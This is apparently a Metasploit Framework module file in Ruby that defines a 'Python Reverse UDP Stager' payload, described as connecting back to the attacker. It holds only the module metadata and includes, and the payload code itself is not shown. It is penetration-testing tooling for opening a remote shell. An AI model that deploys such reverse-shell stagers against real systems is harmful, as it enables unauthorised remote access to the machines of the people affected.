##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/reverse_udp'
require 'msf/core/payload/python/reverse_udp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module MetasploitModule

  CachedSize = 454

  include Msf::Payload::Stager
  include Msf::Payload::Python::ReverseUdp

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'Python Reverse UDP Stager',
      'Description' => 'Connect back to the attacker',
      'Author'      => 'Spencer McIntyre',
      'License'     => MSF_LICENSE,
      'Platform'    => 'python',
      'Arch'        => ARCH_PYTHON,
      'Handler'     => Msf::Handler::ReverseUdp,
      'Stager'      => {'Payload' => ""}
    ))
  end
end
